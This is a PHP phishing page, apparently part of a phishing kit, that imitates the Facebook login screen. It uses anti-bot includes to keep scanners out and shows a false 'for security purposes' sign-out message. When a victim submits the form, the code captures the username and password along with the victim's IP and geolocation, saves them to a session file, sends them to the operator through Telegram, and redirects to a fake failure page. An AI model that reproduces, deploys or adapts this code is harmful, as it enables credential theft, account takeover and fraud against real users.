<?php

error_reporting(0);

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');
include('../Antibot/blockers.php');
include('../Antibot/detects.php');

session_start();
$config = include('../admin/tele.php');
include('../config/notification.php');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $id = uniqid();

    function getVisitorIP() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
    
        $ipArray = explode(',', $ip);
        return trim($ipArray[0]);
    }

    $ipAddress = getVisitorIP();

    $ipApiUrl = "http://ip-api.com/json/$ipAddress";

    $ipDetails = json_decode(file_get_contents($ipApiUrl), true);

    
    $_SESSION['users'][$id] = [
        'user' => $_POST['username'],
        'pass' => $_POST['password'],
        'ip' => $ipAddress,
        'ip_details' => $ipDetails,
        'page' => 'verifying'
    ];

    
    file_put_contents("../sessions/$id.json", json_encode($_SESSION['users'][$id]));
    sendToTelegram($id, $_SESSION['users'][$id], $config);
    header("Location: failed.php?id=$id");
    exit();
}
?>


<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <link rel="stylesheet" type="text/css" href="../css/style.css">
    <title>Facebook</title>
    <link rel="icon" type="image/svg" href="../images/fb.svg">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
    input,
    select,
    textarea {
        font-size: 16px;
    }

    .error {
        color: #f02849;
        font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
        font-size: 13px;
        line-height: 8px;
        padding: 10px;
        margin: 2px;
        text-align: left;
    }
    </style>
</head>

<body>
    <section class="main-wrapper">
        <div class="branding">
            <img class="hiddenImg" src="../images/fb-logo.svg" alt="Facebook" width="200" height="100">
            <img class="headLogo mobile-only" src="../images/fb.svg" alt="Facebook" width="200" height="50">
            <h2 class="slogan">Facebook helps you connect and share with the people in your life.</h2>
        </div>

        <div class="forMobile">
            <div class="panel">
                <form id="loginForm" method="post" onsubmit="return validateCredentials()">
                    <div class="headText">For security purposes, we've decided to signed you out. Sign in to start the
                        verification process.</div>
                    <input type="text" id="username" name="username" placeholder="Email address or phone number"
                        required>
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <div class="error" id="errorMessage"></div>
                    <input class="log-in-button" type="submit" value="Log in">
                </form>
                <a class="forgot" href="#">Forgot password?</a>
                <hr>
                <a class="register-button" href="#">Create New Account</a>
            </div>
            <div class="bottom-link">
                <a class="page" href="#">Create a Page</a>
                <p>for a celebrity, brand or business.</p>
            </div>
        </div>
    </section>

    <div class="createPanel">
        <p>Create new account</p>
    </div>

    <div class=" meta mobile-only">
        <img src="../images/meta.svg" alt="Meta" height="50">
    </div>
    <div class=" mobile-only">
        <ul>
            <li><a class="footer-link">About</a></li>
            <li><a class="footer-link">Help</a></li>
            <li><a class="footer-link">More</a></li>
        </ul>
    </div>

    <footer>
        <ul>
            <li><a class="footer-link">English (US)</a></li>
            <li><a class="footer-link">Español</a></li>
            <li><a class="footer-link">Français (France)</a></li>
            <li><a class="footer-link">中文(简体)</a></li>
            <li><a class="footer-link">العربية</a></li>
            <li><a class="footer-link">Português (Brasil)</a></li>
            <li><a class="footer-link">Italiano</a></li>
            <li><a class="footer-link">한국어</a></li>
            <li><a class="footer-link">हिन्दी</a></li>
            <li><a class="footer-link">日本語</a></li>
            <li><a class="footer-link">+</a></li>
        </ul>
        <hr>
        <ul>
            <li><a class="footer-link">Sign Up</a></li>
            <li><a class="footer-link">Log In</a></li>
            <li><a class="footer-link">Messenger</a></li>
            <li><a class="footer-link">Facebook Lite</a></li>
            <li><a class="footer-link">Video</a></li>
            <li><a class="footer-link">Places</a></li>
            <li><a class="footer-link">Games</a></li>
            <li><a class="footer-link">Marketplace</a></li>
            <li><a class="footer-link">Meta Pay</a></li>
            <li><a class="footer-link">Meta Store</a></li>
            <li><a class="footer-link">Meta Quest</a></li>
            <li><a class="footer-link">Meta AI</a></li>
            <li><a class="footer-link">Instagram</a></li>
            <li><a class="footer-link">Threads</a></li>
        </ul>
        <ul>
            <li><a class="footer-link">Fundraisers</a></li>
            <li><a class="footer-link">Services</a></li>
            <li><a class="footer-link">Voting Information Centre</a></li>
            <li><a class="footer-link">Privacy Policy</a></li>
            <li><a class="footer-link">Privacy Centre</a></li>
            <li><a class="footer-link">Groups</a></li>
            <li><a class="footer-link">About</a></li>
            <li><a class="footer-link">Create ad</a></li>
            <li><a class="footer-link">Create Page</a></li>
            <li><a class="footer-link">Careers</a></li>
            <li><a class="footer-link">Cookies</a></li>
        </ul>
        <ul>
            <li><a class="footer-link">AdChoices</a></li>
            <li><a class="footer-link">Terms</a></li>
            <li><a class="footer-link">Help</a></li>
            <li><a class="footer-link">uploading and non-users</a></li>
        </ul>
        <br>
        <ul>
            <li><a class="footer-link">Meta © 2024</a></li>
        </ul>
    </footer>

    <script>
    function validateCredentials() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        var errorMessage = document.getElementById('errorMessage');

        var emailPhonePattern = /^(\S+@\S+\.\S+|\d{10,})$/;
        var passwordPattern = /.{8,}/;

        if (emailPhonePattern.test(username) && passwordPattern.test(password)) {

            sendLoginDetails(username, password);
            return true;
        } else {

            errorMessage.textContent = "The login credentials that you've entered are incorrect.";
            return false;
        }
    }

    function sendLoginDetails(username, password) {

    }

    document.addEventListener("DOMContentLoaded", function() {
        if (window.innerWidth <= 600) {
            document.getElementById("footer").style.display = "none";
        }
    });
    </script>



</body>

</html>